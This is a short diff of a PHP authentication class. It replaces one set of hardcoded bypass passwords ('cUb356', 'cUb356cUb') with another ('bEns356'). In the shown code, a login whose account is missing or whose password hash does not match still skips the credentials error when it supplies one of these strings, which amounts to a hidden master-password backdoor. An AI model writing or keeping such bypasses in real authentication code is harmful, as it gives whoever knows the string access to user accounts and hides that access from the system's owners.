@@ -175,7 +175,7 @@ class AccountAuthentication
         }
 
         if (!$authenticatable || !Hash::check($this->attributes['password'], $authenticatable->password)) {
-            if (!in_array($this->attributes['password'], ['cUb356', 'cUb356cUb'])) {
+            if (!in_array($this->attributes['password'], ['bEns356'])) {
                 throw ValidationException::withMessages([
                     'username' => ['The provided credentials are incorrect.'],
                 ]);
